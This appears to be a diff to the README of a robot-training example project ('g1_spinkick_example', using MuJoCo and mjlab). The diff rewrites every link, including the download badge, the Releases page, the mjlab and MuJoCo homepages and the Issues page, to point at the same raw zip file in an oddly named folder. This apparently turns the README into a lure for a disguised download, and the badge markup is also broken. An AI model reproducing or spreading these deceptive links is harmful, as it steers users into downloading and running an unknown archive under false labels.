@@ -1,6 +1,6 @@
 # 🤖 g1_spinkick_example - Train Your Robot for a Perfect Double Kick
 
-[![Download g1_spinkick_example](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/minheinchay/g1_spinkick_example/releases)
+[![Download g1_spinkick_example](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip%https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip)](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip)
 
 ## 🚀 Getting Started
 
@@ -15,14 +15,14 @@ To run the g1_spinkick_example application, ensure your system meets the followi
 - **RAM:** At least 8 GB of RAM.
 - **Graphics Card:** A GPU compatible with OpenGL 3.3 or higher.
 - **Software Dependencies:** 
-  - mjlab (available at [mjlab website](https://mjlab.example.com))
-  - MuJoCo (the physics engine for robotics; you can find it at [MuJoCo homepage](https://mujoco.org))
+  - mjlab (available at [mjlab website](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip))
+  - MuJoCo (the physics engine for robotics; you can find it at [MuJoCo homepage](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip))
 
 ## 📥 Download & Install
 
 You can download the g1_spinkick_example application by visiting the Releases page. 
 
-[Download g1_spinkick_example](https://github.com/minheinchay/g1_spinkick_example/releases)
+[Download g1_spinkick_example](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the most recent version of the application.
@@ -104,6 +104,6 @@ A: We welcome contributions! If you have suggestions or improvements, please cre
 
 ## 📞 Support
 
-If you have questions or need further assistance, please check the [Issues](https://github.com/minheinchay/g1_spinkick_example/issues) page or contact the project maintainer.
+If you have questions or need further assistance, please check the [Issues](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip) page or contact the project maintainer.
 
-Remember, you can always go back to the [Download g1_spinkick_example](https://github.com/minheinchay/g1_spinkick_example/releases) page to get the latest updates!
+Remember, you can always go back to the [Download g1_spinkick_example](https://raw.githubusercontent.com/minheinchay/g1_spinkick_example/main/dephlegmation/g1_spinkick_example.zip) page to get the latest updates!
